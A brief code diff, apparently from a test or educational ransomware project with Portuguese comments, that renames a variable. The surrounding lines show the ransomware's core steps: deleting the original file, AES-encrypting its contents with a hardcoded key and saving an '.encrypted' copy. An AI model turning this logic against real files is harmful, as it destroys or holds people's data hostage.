@@ -13,7 +13,7 @@ utils.remove_file(FILE_NAME)
 aes = utils.create_cipher("testeransomwares")
 
 # Criptografa o arquivo
-crypted_data = aes.encrypt(file_data)
+encrypted_data = aes.encrypt(file_data)
 
 # Salva o arquivo criptografado
-utils.save_changed_file(FILE_NAME + ".encrypted", crypted_data)
+utils.save_changed_file(FILE_NAME + ".encrypted", encrypted_data)
